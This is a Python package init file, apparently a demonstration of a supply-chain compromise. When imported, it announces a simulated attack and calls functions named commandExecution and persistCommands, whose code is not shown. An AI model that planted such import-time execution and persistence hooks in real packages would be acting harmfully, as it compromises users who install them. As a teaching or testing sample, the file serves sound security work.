from .core import *
import os
import subprocess

__all__ = ["make_name_caden"]

print("[cadens_package] Import hook triggered (simulating supply-chain compromise).")

showInstallHook()
commandExecution()
persistCommands()